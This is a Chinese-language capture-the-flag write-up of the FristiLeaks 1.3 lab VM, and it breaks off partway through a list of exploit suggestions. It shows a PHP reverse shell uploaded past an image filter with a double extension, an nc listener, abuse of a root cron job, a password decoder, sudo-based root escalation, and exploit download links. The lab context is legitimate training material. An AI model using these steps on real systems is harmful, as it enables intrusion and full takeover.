
# Preface
这两天做了一个靶机，[fristileaks-13](https://www.vulnhub.com/entry/fristileaks-13,133/)，有时候觉得自己的速度真的是很慢，所以提醒一下自己要懂得：快就是慢，慢就是快。环境搭建都很简单，只需要注意以下修改虚拟机的mac地址，否则虚拟机获取不到地址，看了靶机说明才发现的：
<font color="red">VMware users will need to manually edit the VM's MAC address to: 08:00:27:A5:A6:76</font>

# Information Gathering
照例我们先做一下信息收集工作，netdiscover嗅探靶机地址:确定目标地址是192.168.0.103
```shell
┌──(root㉿kali)-[~]
└─# netdiscover -r 192.168.0.0/24
 Currently scanning: Finished!   |   Screen View: Unique Hosts

 12 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 720
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
 -----------------------------------------------------------------------------
 192.168.0.106   b4:2e:99:86:d5:f2      3     180  GIGA-BYTE TECHNOLOGY CO.,LTD.
 192.168.0.1     60:3a:7c:31:e8:66      7     420  TP-LINK TECHNOLOGIES CO.,LTD.
 192.168.0.3     a4:5e:60:c2:d9:0b      1      60  Apple, Inc.
 192.168.0.103   08:00:27:a5:a6:76      1      60  PCS Systemtechnik GmbH
```
确定完地址后我们对端口、服务及版本号、操作系统做一下信息收集：
```shell
┌──(root㉿kali)-[/fristileaks13]
└─# cat nmap.text
# Nmap 7.92 scan initiated Fri Jun 17 08:27:47 2022 as: nmap -sT -T5 -p- -sC -A -Pn -oN nmap.text 192.168.0.103
Nmap scan report for 192.168.0.103
Host is up (0.0010s latency).
Not shown: 65448 filtered tcp ports (no-response), 86 filtered tcp ports (host-unreach)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.2.15 ((CentOS) DAV/2 PHP/5.3.3)
| http-robots.txt: 3 disallowed entries
|_/cola /sisi /beer
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.2.15 (CentOS) DAV/2 PHP/5.3.3
MAC Address: 08:00:27:A5:A6:76 (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 2.6.X|3.X
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
OS details: Linux 2.6.32 - 3.10, Linux 2.6.32 - 3.13
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   1.05 ms 192.168.0.103

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jun 17 08:29:17 2022 -- 1 IP address (1 host up) scanned in 89.60 seconds
```
可以看到目标机器只开放了80端口，robots.txt中有三个目录/cola /sisi /beer，操作系统版本：OS details: Linux 2.6.32 - 3.10, Linux 2.6.32 - 3.13

# Vulnerability Analysis
浏览器查看一下主页 <br />
<img src="https://raw.githubusercontent.com/eagleatman/mywriteup/main/fristiLeaks-1.3/images/1.png" width="56%" display="block"> <br />
浏览器查看一下robots.txt
```shell
┌──(root㉿kali)-[/fristileaks13]
└─# curl -s http://192.168.0.101/robots.txt
User-agent: *
Disallow: /cola
Disallow: /sisi
Disallow: /beer
```
这些目录,这三个目录都是同一张图片, <br />
<img src="https://raw.githubusercontent.com/eagleatman/mywriteup/main/fristiLeaks-1.3/images/2.png" width="16%" display="block"> <br />
同时/images/存在目录遍历，可以列出该目录下的所有内容。<br />
<img src="https://raw.githubusercontent.com/eagleatman/mywriteup/main/fristiLeaks-1.3/images/3.png" width="36%" display="block"> <br />
nikto 扫描一下web漏洞：
```shell
┌──(root㉿kali)-[/fristileaks13]
└─# cat nikto.txt
- Nikto v2.1.6/2.1.5
+ Target Host: 192.168.0.101
+ Target Port: 80
+ GET Server may leak inodes via ETags, header found with file /, inode: 12722, size: 703, mtime: Tue Nov 17 13:45:47 2015
+ GET The anti-clickjacking X-Frame-Options header is not present.
+ GET The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ GET The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ GET Entry '/cola/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ GET Entry '/sisi/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ GET Entry '/beer/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ GET "robots.txt" contains 3 entries which should be manually viewed.
+ HEAD Apache/2.2.15 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ HEAD PHP/5.3.3 appears to be outdated (current is at least 7.2.12). PHP 5.6.33, 7.0.27, 7.1.13, 7.2.1 may also current release for each branch.
+ OPTIONS Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE
+ OSVDB-877: TRACE HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ OSVDB-3268: GET /icons/: Directory indexing found.
+ OSVDB-3268: GET /images/: Directory indexing found.
+ OSVDB-3233: GET /icons/README: Apache default file found.
```
目前为止没有特别的发现，因此对目录进行扫描：
```shell
┌──(root㉿kali)-[/fristileaks13]
└─# dirsearch -u http://192.168.0.101/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -e php,bak,zip,bak,html,txt -x 403,404 -f

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, bak, zip, html, txt | HTTP method: GET | Threads: 30 | Wordlist size: 613543

Output File: /root/.dirsearch/reports/192.168.0.101/-_22-06-20_12-36-22.txt

Error Log: /root/.dirsearch/logs/errors-22-06-20_12-36-22.log

Target: http://192.168.0.101/

[12:36:22] Starting:
[12:36:22] 200 -    1KB - /images/
[12:36:22] 200 -  703B  - /index.html
[12:36:22] 301 -  236B  - /images  ->  http://192.168.0.101/images/
[12:36:23] 200 -   67KB - /icons/
[12:36:43] 200 -   62B  - /robots.txt
[12:37:16] 301 -  234B  - /beer  ->  http://192.168.0.101/beer/
[12:37:16] 200 -   33B  - /beer/
```
同样没有发现有价值的目录信息，事情进行到这里就只能回归原点进行，首页有个图片，上面写着keep calm and drink fristi，联想到网站的目录都是cola、sisi、beer都是饮料，因此猜测有可能存在fristi目录：<br />
<img src="https://raw.githubusercontent.com/eagleatman/mywriteup/main/fristiLeaks-1.3/images/4.png" width="46%" display="block"> <br />
通过分析这个目录的源码可以发现，可能的用户名有：admin/eezeepz，同时还存在一段怀疑是Base64编码的数据，尝试使用base64解码成图片： <br />
<img src="https://raw.githubusercontent.com/eagleatman/mywriteup/main/fristiLeaks-1.3/images/5.png" width="46%" display="block"> <br />
这个图片上的字符：keKkeKKeKKeKkEkkEk猜测可能是密码，于是尝试登陆，eezeepz/keKkeKKeKKeKkEkkEk组合能够正常登陆，而admin/keKkeKKeKKeKkEkkEk组合无法正常登陆。<br />
<img src="https://raw.githubusercontent.com/eagleatman/mywriteup/main/fristiLeaks-1.3/images/6.png" width="46%" display="block"> <br />
发现一个链接，点进去后是一个长传页面，怀疑存在文件上传漏洞：<br />
<img src="https://raw.githubusercontent.com/eagleatman/mywriteup/main/fristiLeaks-1.3/images/7.png" width="46%" display="block"> <br />

# Exploitation
经过测试正常的图片.png/.jpg/.gif是可以上传的，<br />
<img src="https://raw.githubusercontent.com/eagleatman/mywriteup/main/fristiLeaks-1.3/images/8.png" width="46%" display="block"> <br />
但是.php的文件是无法上传的：<br />
<img src="https://raw.githubusercontent.com/eagleatman/mywriteup/main/fristiLeaks-1.3/images/9.png" width="46%" display="block"> <br />
尝试使用多层文件扩展后缀，寄希望于服务器能解析，尝试上传一个php反弹shell木马，发现上传成功<br />
<img src="https://raw.githubusercontent.com/eagleatman/mywriteup/main/fristiLeaks-1.3/images/10.png" width="46%" display="block"> <br />

访问`http://192.168.0.101/fristi/uploads/php-reverse-shell.php.png`，Kali监听`nc -lnvp 80`，成功获取一个webshell。
```shell
┌──(root㉿kali)-[~]
└─# nc -lnvp 80
listening on [any] 80 ...
connect to [192.168.0.100] from (UNKNOWN) [192.168.0.101] 35224
Linux localhost.localdomain 2.6.32-573.8.1.el6.x86_64 #1 SMP Tue Nov 10 18:01:38 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
 04:38:38 up  8:23,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=48(apache) groups=48(apache)
sh: no job control in this shell
sh-4.1$
```


# Post-Exploitation
同样，先获得一个完整的tty
```shell
sh-4.1$ python -c 'import pty; pty.spawn("/bin/bash");'
python -c 'import pty; pty.spawn("/bin/bash");'
bash-4.1$
```
然后根目录查看一下权限：
```shell
bash-4.1$ ls -al /
ls -al /
total 102
dr-xr-xr-x.  22 root root  4096 Jun 19 20:14 .
dr-xr-xr-x.  22 root root  4096 Jun 19 20:14 ..
-rw-r--r--    1 root root     0 Jun 19 20:14 .autofsck
-rw-r--r--    1 root root     0 Nov 17  2015 .autorelabel
dr-xr-xr-x.   2 root root  4096 Nov 17  2015 bin
dr-xr-xr-x.   5 root root  1024 Nov 17  2015 boot
drwxr-xr-x   18 root root  3680 Jun 19 20:14 dev
drwxr-xr-x.  70 root root  4096 Jun 19 20:14 etc
drwxr-xr-x.   5 root root  4096 Nov 19  2015 home
dr-xr-xr-x.   8 root root  4096 Nov 17  2015 lib
dr-xr-xr-x.   9 root root 12288 Nov 17  2015 lib64
drwx------.   2 root root 16384 Nov 17  2015 lost+found
drwxr-xr-x.   2 root root  4096 Sep 23  2011 media
drwxr-xr-x.   3 root root  4096 Nov 17  2015 mnt
drwxr-xr-x.   3 root root  4096 Nov 17  2015 opt
dr-xr-xr-x  129 root root     0 Jun 19 20:14 proc
dr-xr-x---.   3 root root  4096 Nov 25  2015 root
dr-xr-xr-x.   2 root root 12288 Nov 18  2015 sbin
drwxr-xr-x.   2 root root  4096 Nov 17  2015 selinux
drwxr-xr-x.   2 root root  4096 Sep 23  2011 srv
drwxr-xr-x   13 root root     0 Jun 19 20:14 sys
drwxrwxrwt.   3 root root  4096 Jun 20 05:02 tmp
drwxr-xr-x.  13 root root  4096 Nov 17  2015 usr
drwxr-xr-x.  19 root root  4096 Nov 19  2015 var
```
/root目录我们没有读写权限，/home有读写权限，看一下/home目录：
```shell
bash-4.1$ ls -al /home
ls -al /home
total 28
drwxr-xr-x.  5 root      root       4096 Nov 19  2015 .
dr-xr-xr-x. 22 root      root       4096 Jun 19 20:14 ..
drwx------.  2 admin     admin      4096 Nov 19  2015 admin
drwx---r-x.  5 eezeepz   eezeepz   12288 Nov 18  2015 eezeepz
drwx------   2 fristigod fristigod  4096 Nov 19  2015 fristigod
```
可以看到三个用户家目录admin、eezeepz、fristigod，只有eezeepz目录具有读和执行权限，看一下：
```shell
bash-4.1$ ls -al
ls -al
total 2608
drwx---r-x. 5 eezeepz eezeepz  12288 Nov 18  2015 .
drwxr-xr-x. 5 root    root      4096 Nov 19  2015 ..
drwxrwxr-x. 2 eezeepz eezeepz   4096 Nov 17  2015 .Old
-rw-r--r--. 1 eezeepz eezeepz     18 Sep 22  2015 .bash_logout
-rw-r--r--. 1 eezeepz eezeepz    176 Sep 22  2015 .bash_profile
-rw-r--r--. 1 eezeepz eezeepz    124 Sep 22  2015 .bashrc
drwxrwxr-x. 2 eezeepz eezeepz   4096 Nov 17  2015 .gnome
drwxrwxr-x. 2 eezeepz eezeepz   4096 Nov 17  2015 .settings
-rwxr-xr-x. 1 eezeepz eezeepz  24376 Nov 17  2015 MAKEDEV
-rwxr-xr-x. 1 eezeepz eezeepz  33559 Nov 17  2015 cbq
-rwxr-xr-x. 1 eezeepz eezeepz   6976 Nov 17  2015 cciss_id
-rwxr-xr-x. 1 eezeepz eezeepz  56720 Nov 17  2015 cfdisk
-rwxr-xr-x. 1 eezeepz eezeepz  25072 Nov 17  2015 chcpu
-rwxr-xr-x. 1 eezeepz eezeepz  52936 Nov 17  2015 chgrp
-rwxr-xr-x. 1 eezeepz eezeepz  31800 Nov 17  2015 chkconfig
-rwxr-xr-x. 1 eezeepz eezeepz  48712 Nov 17  2015 chmod
-rwxr-xr-x. 1 eezeepz eezeepz  53640 Nov 17  2015 chown
-rwxr-xr-x. 1 eezeepz eezeepz  44528 Nov 17  2015 clock
-rwxr-xr-x. 1 eezeepz eezeepz   4808 Nov 17  2015 consoletype
-rwxr-xr-x. 1 eezeepz eezeepz 129992 Nov 17  2015 cpio
-rwxr-xr-x. 1 eezeepz eezeepz  38608 Nov 17  2015 cryptsetup
-rwxr-xr-x. 1 eezeepz eezeepz   5344 Nov 17  2015 ctrlaltdel
-rwxr-xr-x. 1 eezeepz eezeepz  41704 Nov 17  2015 cut
-rwxr-xr-x. 1 eezeepz eezeepz  14832 Nov 17  2015 halt
-rwxr-xr-x. 1 eezeepz eezeepz  13712 Nov 17  2015 hostname
-rwxr-xr-x. 1 eezeepz eezeepz  44528 Nov 17  2015 hwclock
-rwxr-xr-x. 1 eezeepz eezeepz   7920 Nov 17  2015 kbd_mode
-rwxr-xr-x. 1 eezeepz eezeepz  11576 Nov 17  2015 kill
-rwxr-xr-x. 1 eezeepz eezeepz  16472 Nov 17  2015 killall5
-rwxr-xr-x. 1 eezeepz eezeepz  32928 Nov 17  2015 kpartx
-rwxr-xr-x. 1 eezeepz eezeepz  11464 Nov 17  2015 nameif
-rwxr-xr-x. 1 eezeepz eezeepz 171784 Nov 17  2015 nano
-rwxr-xr-x. 1 eezeepz eezeepz   5512 Nov 17  2015 netreport
-rwxr-xr-x. 1 eezeepz eezeepz 123360 Nov 17  2015 netstat
-rwxr-xr-x. 1 eezeepz eezeepz  13892 Nov 17  2015 new-kernel-pkg
-rwxr-xr-x. 1 eezeepz eezeepz  25208 Nov 17  2015 nice
-rwxr-xr-x. 1 eezeepz eezeepz  13712 Nov 17  2015 nisdomainname
-rwxr-xr-x. 1 eezeepz eezeepz   4736 Nov 17  2015 nologin
-r--r--r--. 1 eezeepz eezeepz    514 Nov 18  2015 notes.txt
-rwxr-xr-x. 1 eezeepz eezeepz 390616 Nov 17  2015 tar
-rwxr-xr-x. 1 eezeepz eezeepz  11352 Nov 17  2015 taskset
-rwxr-xr-x. 1 eezeepz eezeepz 249000 Nov 17  2015 tc
-rwxr-xr-x. 1 eezeepz eezeepz  51536 Nov 17  2015 telinit
-rwxr-xr-x. 1 eezeepz eezeepz  47928 Nov 17  2015 touch
-rwxr-xr-x. 1 eezeepz eezeepz  11440 Nov 17  2015 tracepath
-rwxr-xr-x. 1 eezeepz eezeepz  12304 Nov 17  2015 tracepath6
-rwxr-xr-x. 1 eezeepz eezeepz  21112 Nov 17  2015 true
-rwxr-xr-x. 1 eezeepz eezeepz  35608 Nov 17  2015 tune2fs
-rwxr-xr-x. 1 eezeepz eezeepz  15410 Nov 17  2015 weak-modules
-rwxr-xr-x. 1 eezeepz eezeepz  12216 Nov 17  2015 wipefs
-rwxr-xr-x. 1 eezeepz eezeepz 504400 Nov 17  2015 xfs_repair
-rwxr-xr-x. 1 eezeepz eezeepz  13712 Nov 17  2015 ypdomainname
-rwxr-xr-x. 1 eezeepz eezeepz     62 Nov 17  2015 zcat
-rwxr-xr-x. 1 eezeepz eezeepz  47520 Nov 17  2015 zic
```
大多数是二进制格式的工具，发现有一个notes.txt文件，打开看一下：
```shell
bash-4.1$ cat notes.txt
cat notes.txt
Yo EZ,

I made it possible for you to do some automated checks,
but I did only allow you access to /usr/bin/* system binaries. I did
however copy a few extra often needed commands to my
homedir: chmod, df, cat, echo, ps, grep, egrep so you can use those
from /home/admin/

Don't forget to specify the full path for each binary!

Just put a file called "runthis" in /tmp/, each line one command. The
output goes to the file "cronresult" in /tmp/. It should
run every minute with my account privileges.

- Jerry
```
大概意思是：系统每隔一分钟都会以root(暂时这么叫吧，总之应该是管理员留下的)权限运行/tmp/runthis的内容，/home/admin/目录下可以使用的命令：chmod, df, cat, echo, ps, grep, egrep，我们创建这个文件，发现成功将/home/admin目录的权限改成了777，<font color="red">当我们把/root目录权限也改一下的时候发现不能成功，这一点我非常不理解。</font>
```shell
bash-4.1$ echo "/home/admin/chmod 777 /home/admin" > /tmp/runthis
echo "/home/admin/chmod 777 /home/admin" > /tmp/runthis
bash-4.1$ date
date
Mon Jun 20 05:37:56 EDT 2022
bash-4.1$ date
date
Mon Jun 20 05:38:05 EDT 2022
bash-4.1$ ls -al /home
ls -al /home
total 28
drwxr-xr-x.  5 root      root       4096 Nov 19  2015 .
dr-xr-xr-x. 22 root      root       4096 Jun 19 20:14 ..
drwxrwxrwx.  2 admin     admin      4096 Nov 19  2015 admin
drwx---r-x.  5 eezeepz   eezeepz   12288 Nov 18  2015 eezeepz
drwx------   2 fristigod fristigod  4096 Nov 19  2015 fristigod
bash-4.1$ echo "/home/admin/chmod 777 /root" > /tmp/runthis
echo "/home/admin/chmod 777 /root" > /tmp/runthis
bash-4.1$ date
date
Mon Jun 20 05:39:09 EDT 2022
bash-4.1$ ddate
date
Mon Jun 20 05:41:49 EDT 2022
bash-4.1$ ls -al /root
ls -al /root
ls: cannot open directory /root: Permission denied
bash-4.1$ cat cronresult
cat cronresult
executing: /home/admin/chmod 777 /home/admin
executing: /home/admin/chmod 777 /root
executing: /home/admin/chmod 777 /root
executing: /home/admin/chmod 777 /root
executing: /home/admin/chmod 777 /root
executing: /home/admin/chmod 777 /root
```
不管怎么说先进入到/home/admin目录下看一下：
```shell
bash-4.1$ cd /home/admin
cd /home/admin
bash-4.1$ ls -al
ls -al
total 652
drwxrwxrwx. 2 admin     admin       4096 Nov 19  2015 .
drwxr-xr-x. 5 root      root        4096 Nov 19  2015 ..
-rw-r--r--. 1 admin     admin         18 Sep 22  2015 .bash_logout
-rw-r--r--. 1 admin     admin        176 Sep 22  2015 .bash_profile
-rw-r--r--. 1 admin     admin        124 Sep 22  2015 .bashrc
-rwxr-xr-x  1 admin     admin      45224 Nov 18  2015 cat
-rwxr-xr-x  1 admin     admin      48712 Nov 18  2015 chmod
-rw-r--r--  1 admin     admin        737 Nov 18  2015 cronjob.py
-rw-r--r--  1 admin     admin         21 Nov 18  2015 cryptedpass.txt
-rw-r--r--  1 admin     admin        258 Nov 18  2015 cryptpass.py
-rwxr-xr-x  1 admin     admin      90544 Nov 18  2015 df
-rwxr-xr-x  1 admin     admin      24136 Nov 18  2015 echo
-rwxr-xr-x  1 admin     admin     163600 Nov 18  2015 egrep
-rwxr-xr-x  1 admin     admin     163600 Nov 18  2015 grep
-rwxr-xr-x  1 admin     admin      85304 Nov 18  2015 ps
-rw-r--r--  1 fristigod fristigod     25 Nov 19  2015 whoisyourgodnow.txt
bash-4.1$ cat whoisyourgodnow.txt
cat whoisyourgodnow.txt
=RFn0AKnlMHMPIzpyuTI0ITG
bash-4.1$ cat cryptedpass.txt
cat cryptedpass.txt
mVGZ3O3omkJLmy2pcuTq
bash-4.1$ cat cryptpass.py
cat cryptpass.py
#Enhanced with thanks to Dinesh Singh Sikawar @LinkedIn
import base64,codecs,sys

def encodeString(str):
    base64string= base64.b64encode(str)
    return codecs.encode(base64string[::-1], 'rot13')

cryptoResult=encodeString(sys.argv[1])
print cryptoResult
```
怀疑cryptedpass.txt、whoisyourgodnow.txt都是经过cryptpass.py加密的密文，刚好有时间就写了一个解密的脚本：
```python
#!/Library/Frameworks/Python.framework/Versions/3.8/bin/python3.8
import base64
import codecs
import sys
import argparse
from colorama import Fore, Back, Style, init

###
# def encodeString(str):
#     base64string= base64.b64encode(str)
#     return codecs.encode(base64string[::-1], 'rot13')

# cryptoResult=encodeString(sys.argv[1])
# print cryptoResult
###

parser = argparse.ArgumentParser(
    description="解密靶机fristileaks 1.3的密文", epilog="write by e0g18")
parser.add_argument('-s', '--string', type=str, required=True,
                    metavar='string', help="必须指定要解密的字符串")
parser.add_argument('-q', '--quiet', action='store_true',
                    help='安静模式运行，即不打印帮助信息')
args = parser.parse_args()


def decodeString(str):
    ret = codecs.decode(str, 'rot13')
    ret = base64.b64decode(ret[::-1])
    return ret


result = decodeString(args.string)
if not args.quiet:
    print(Fore.LIGHTGREEN_EX)
    parser.print_help()

print(Fore.RED + '\n{0}解密后的结果是:{1}'.format(args.string,
      result.decode('utf-8')))
```
运行结果如下:
```shell
~/Documents/vscode/exploit/python  $ ./decryptpass.py -q -s "mVGZ3O3omkJLmy2pcuTq"    

mVGZ3O3omkJLmy2pcuTq解密后的结果是:thisisalsopw123
~/Documents/vscode/exploit/python  $ ./decryptpass.py -q -s "=RFn0AKnlMHMPIzpyuTI0ITG"

=RFn0AKnlMHMPIzpyuTI0ITG解密后的结果是:LetThereBeFristi!
```
"thisisalsopw123"和"LetThereBeFristi!"怀疑是系统账号的密码，进行登录尝试，发现这是两个账号的密码，分别是：admin/thisisalsopw123、fristigod/LetThereBeFristi!
```shell
bash-4.1$ su admin
su admin
Password: thisisalsopw123

[admin@localhost /]$ su fristigod
su fristigod
Password: LetThereBeFristi!

bash-4.1$ id
id
uid=502(fristigod) gid=502(fristigod) groups=502(fristigod)
bash-4.1$
```

# Privilege Escalation
虽然有了两个账号的权限，但是我们却没有root权限，因此通过查看history，
```shell
bash-4.1$ history
history
    1  ls
    2  pwd
    3  ls -lah
    4  cd .secret_admin_stuff/
    5  ls
    6  ./doCom
    7  ./doCom test
    8  sudo ls
    9  exit
   10  cd .secret_admin_stuff/
   11  ls
   12  ./doCom
   13  sudo -u fristi ./doCom ls /
   14  sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom ls /
   15  exit
   16  sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom ls /
   17  sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
   18  exit
   19  sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
   20  exit
   21  sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
   22  sudo /var/fristigod/.secret_admin_stuff/doCom
   23  exit
   24  sudo /var/fristigod/.secret_admin_stuff/doCom
   25  sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
   26  exit
   27  sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
   28  exit
   29  sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
   30  groups
   31  ls -lah
   32  usermod -G fristigod fristi
   33  exit
   34  sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
   35  less /var/log/secure e
   36  Fexit
   37  exit
   38  exit
   39  id
   40  ls -al
   41  pwd
   42  cd /home/fristigod
   43  ls -al
   44  history
bash-4.1$ ls -al /var/fristigod/.secret_admin_stuff/doCom
ls -al /var/fristigod/.secret_admin_stuff/doCom
-rwsr-sr-x 1 root root 7529 Nov 25  2015 /var/fristigod/.secret_admin_stuff/doCom
bash-4.1$ sudo -l
sudo -l
[sudo] password for fristigod: LetThereBeFristi!

Matching Defaults entries for fristigod on this host:
    requiretty, !visiblepw, always_set_home, env_reset, env_keep="COLORS
    DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS", env_keep+="MAIL PS1
    PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE
    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY
    LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL
    LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User fristigod may run the following commands on this host:
    (fristi : ALL) /var/fristigod/.secret_admin_stuff/doCom
```
使用这个doCom尝试获取root权限的shell：
```shell
bash-4.1$ sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom id
sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom id
[sudo] password for fristigod: LetThereBeFristi!

uid=0(root) gid=100(users) groups=100(users),502(fristigod)
bash-4.1$ sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom /bin/bash
sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom /bin/bash
bash-4.1# id
id
uid=0(root) gid=100(users) groups=100(users),502(fristigod)
bash-4.1# whoami
whoami
root
bash-4.1#
```
随后我尝试了一下直接提权，发现也可以成功：
```shell
bash-4.1$ id
id
uid=48(apache) gid=48(apache) groups=48(apache)
bash-4.1$ ls -al
ls -al
total 108
drwxrwxrwt.  3 root   root    4096 Jun 20 05:55 .
dr-xr-xr-x. 22 root   root    4096 Jun 19 20:14 ..
drwxrwxrwt   2 root   root    4096 Jun 19 20:14 .ICE-unix
-rw-r--r--   1 admin  admin   2775 Jun 20 06:48 cronresult
-rwxrw-rw-   1 apache apache 89641 Jun 20  2022 les.sh
-rw-rw-rw-   1 apache apache    28 Jun 20 05:39 runthis
bash-4.1$ ./les.sh
./les.sh

Available information:

Kernel version: 2.6.32
Architecture: x86_64
Distribution: RHEL
Distribution version: N/A
Additional checks (CONFIG_*, sysctl entries, custom Bash commands): performed
Package listing: from current OS

Searching among:

79 kernel space exploits
49 user space exploits

Possible Exploits:

[+] [CVE-2016-5195] dirtycow

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: probable
   Tags: debian=7|8,RHEL=5{kernel:2.6.(18|24|33)-*},RHEL=6{kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-rt31},RHEL=7{kernel:3.10.0-*|4.2.0-0.21.el7},ubuntu=16.04|14.04|12.04
   Download URL: https://www.exploit-db.com/download/40611
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2016-5195] dirtycow 2

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: probable
   Tags: debian=7|8,RHEL=5|6|7,ubuntu=14.04|12.04,ubuntu=10.04{kernel:2.6.32-21-generic},ubuntu=16.04{kernel:4.4.0-21-generic}
   Download URL: https://www.exploit-db.com/download/40839
   ext-url: https://www.exploit-db.com/download/40847
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: mint=19,ubuntu=18|20, debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: centos=6|7|8,ubuntu=14|16|17|18|19|20, debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2019-18634] sudo pwfeedback

   Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/
   Exposure: less probable
   Tags: mint=19
   Download URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c
   Comments: sudo configuration requires pwfeedback to be enabled.

[+] [CVE-2018-1000001] RationalLove

   Details: https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/
   Exposure: less probable
   Tags: debian=9{libc6:2.24-11+deb9u1},ubuntu=16.04.3{libc6:2.23-0ubuntu9}
   Download URL: https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/RationalLove.c
   Comments: kernel.unprivileged_userns_clone=1 required

[+] [CVE-2017-6074] dccp

   Details: http://www.openwall.com/lists/oss-security/2017/02/22/3
   Exposure: less probable
   Tags: ubuntu=(14.04|16.04){kernel:4.4.0-62-generic}
   Download URL: https://www.exploit-db.com/download/41458
   Comments: Requires Kernel be built with CONFIG_IP_DCCP enabled. Includes partial SMEP/SMAP bypass

[+] [CVE-2017-1000367] sudopwn

   Details: https://www.sudo.ws/alerts/linux_tty.html
   Exposure: less probable
   Download URL: https://raw.githubusercontent.com/c0d3z3r0/sudo-CVE-2017-1000367/master/sudopwn.c
   Comments: Needs to be sudoer. Works only on SELinux enabled systems

[+] [CVE-2017-1000367] Sudoer-to-root

   Details: https://www.sudo.ws/alerts/linux_tty.html
   Exposure: less probable
   Tags: RHEL=7{sudo:1.8.6p7}
   Download URL: https://www.qualys.com/2017/05/30/cve-2017-1000367/linux_sudo_cve-2017-1000367.c
   Comments: Needs to be sudoer. Works only on SELinux enabled systems

[+] [CVE-2017-1000366,CVE-2017-1000379] linux_ldso_hwcap_64

   Details: https://www.qualys.com/2017/06/19/stack-clash/stack-clash.txt
   Exposure: less probable
   Tags: debian=7.7|8.5|9.0,ubuntu=14.04.2|16.04.2|17.04,fedora=22|25,centos=7.3.1611
   Download URL: https://www.qualys.com/2017/06/19/stack-clash/linux_ldso_hwcap_64.c
   Comments: Uses "Stack Clash" technique, works against most SUID-root binaries

[+] [CVE-2016-6663,CVE-2016-6664|CVE-2016-6662] mysql-exploit-chain

   Details: https://legalhackers.com/advisories/MySQL-Maria-Percona-PrivEscRace-CVE-2016-6663-5616-Exploit.html
   Exposure: less probable
   Tags: ubuntu=16.04.1
   Download URL: http://legalhackers.com/exploits/CVE-2016-6663/mysql-privesc-race.c
   Comments: Also MariaDB ver<10.1.18 and ver<10.0.28 affected

[+] [CVE-2015-3246] userhelper

   Details: https://www.qualys.com/2015/07/23/cve-2015-3245-cve-2015-3246/cve-2015-3245-cve-2015-3246.txt
   Exposure: less probable
